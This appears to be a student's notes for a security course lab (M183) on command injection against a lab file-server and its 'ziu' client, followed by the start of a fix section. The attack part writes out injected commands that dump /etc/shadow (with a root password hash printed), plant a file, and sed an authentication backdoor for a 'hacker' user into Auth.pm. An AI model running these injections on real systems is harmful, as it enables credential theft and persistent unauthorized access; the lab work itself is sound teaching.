
[<- back to start](linkk)

# M183
## Get Server Ready

### vmLP1
### Änderungen im Server-Code auf den Server verteilen und Server direkt starten
```bash
cd code/server
```

```bash
bash deploy.sh
```
### Server auf Entwickler-PC direkt ab Source starten

```bash
cd code/server
```

```perl
perl -Ilib bin/fulla
```

### vmLS3
### turn on live logs

```bash
tail -f fulla.*
```

## Get Client Ready

```bash
ziu --help 
ziu login # use admin anna 
FULLAIP=192.168.220.13 ziu list 
export FULLAIP=192.168.220.13 
cd /code/client; bash deploy.sh 
cd /code/client; perl ziu list
```

if this error occurs

![SessionNotValid](/Img/m183SessionNotValid.png)

Login again and it should work

![ZiuLogin](/Img/m183ZiuLogin.png)


## 2.2 Angriffe Ausführen

### 2.2.1

### Aufgabe 6

create the readme.txt

```perl
ziu 'list -l; echo "Bei telefonischen Anfragen von Herr W. Beinhart: Dem Anrufer bitte Root-Passwort mitteilen!" > /tmp/readme.txt'
```

check if it worked

```perl
ziu "list -l; cat /tmp/readme.txt"
```

should display the contents of the file

if it doesn't it either didn't work or is bugged

check on the server (optional & if possible)

```bash
cat /tmp/readme.txt"
```
#### Aufgabe 7

get passwort hashes
```
ziu "list -l; cat /etc/shadow"
```

pw hashes result

```powershell
root:$y$j9T$nS/i7F9QsxP6xp/.cpizu/$6EkkwPJxehs6zwUfwxSEfkjtTd4VASC5imokYUE65YA:19592:0:99999:7:::
daemon:*:19405:0:99999:7:::
bin:*:19405:0:99999:7:::
sys:*:19405:0:99999:7:::
sync:*:19405:0:99999:7:::
games:*:19405:0:99999:7:::
man:*:19405:0:99999:7:::
lp:*:19405:0:99999:7:::
mail:*:19405:0:99999:7:::
news:*:19405:0:99999:7:::
uucp:*:19405:0:99999:7:::
proxy:*:19405:0:99999:7:::
www-data:*:19405:0:99999:7:::
backup:*:19405:0:99999:7:::
list:*:19405:0:99999:7:::
irc:*:19405:0:99999:7:::
gnats:*:19405:0:99999:7:::
nobody:*:19405:0:99999:7:::
_apt:*:19405:0:99999:7:::
systemd-network:*:19405:0:99999:7:::
systemd-resolve:*:19405:0:99999:7:::
messagebus:*:19405:0:99999:7:::
systemd-t

```
### 2.2.2

### Aufgabe 8

option 1

```bash
ziu "list; sudo sed -i '50 c if (\$user_id || \$user == \"Hacker\") {' /usr/share/perl5/Fulla/Auth.pm"
```

option 2

```bash
ziu 'list -l; searchText="if (\$user_id) {"; replaceText="if (\$user_id || \$user eq \"hacker\") {"; sed -i "s/$(echo $searchText)/$(echo $replaceText)/"/usr/share/perl5/Fulla/Auth.pm'
```

restart server

```perl
sudo pkill -F pid.fulla
```

Login with hacker

```perl
ziu login
```



## 3 Kommando-Injektion (fix)

### 3.1 Applikatoiinsbenutzer verwenden

#### Aufgabe 1

```bash
patch deploy.sh patches/deploy_as_app-user.patch
```

### 3.2 Auswertung Angriffsübung

### 3.4 Esterne Daten prüfen

#### 3.4.1 Eingagben "Escapen

Installation einer Library welche Shell-Escaping anbietet

```bash
sudo apt install libstring-shellquote-perl
```

```bash
echo \'; # '

echo ';' # ;
```


### 3.5 Praxis



